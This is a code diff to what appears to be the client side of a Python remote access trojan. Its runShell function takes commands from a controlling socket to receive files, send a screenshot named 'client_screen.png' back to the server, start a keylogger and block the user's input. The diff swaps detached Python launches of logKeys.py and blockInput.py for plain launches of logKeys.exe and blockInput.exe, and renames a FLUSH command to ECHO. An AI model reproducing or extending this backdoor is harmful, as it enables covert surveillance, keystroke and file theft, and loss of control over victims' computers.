@@ -19,8 +19,8 @@ def runShell(socketHolder):
 	if data:
 		if data == "SENDFILE":
 			incomingFile(socketHolder)
-		elif data == "FLUSH":
-			socketHolder.send("FLUSH")
+		elif data == "ECHO":
+			socketHolder.send("ECHO")
 		elif data == "RECOVERFILE":
 			fileName = "client_screen.png"
 			sendToServer(fileName, socketHolder)
@@ -39,17 +39,10 @@ def runShell(socketHolder):
 			socketHolder.close()
 			sys.exit(0)
 		elif data == "LOGKEYSON":
-			# Execute an external program without waiting for it to finish
-			CREATE_NEW_PROCESS_GROUP = 0x00000200
-			DETACHED_PROCESS = 0x00000008
-			pid = subprocess.Popen([sys.executable, "logKeys.py"],
-				creationflags=DETACHED_PROCESS).pid
+			process = subprocess.Popen(['logKeys.exe'])
 			socketHolder.send('Logger started')
 		elif data == 'BLOCKINPUT':
-			CREATE_NEW_PROCESS_GROUP = 0x00000200
-			DETACHED_PROCESS = 0x00000008
-			pid = subprocess.Popen([sys.executable, "blockInput.py"],
-				creationflags=DETACHED_PROCESS).pid
+			process = subprocess.Popen(['blockInput.exe'])
 			socketHolder.send('Block Input started')
 		elif len(data) == 0:
 			return True
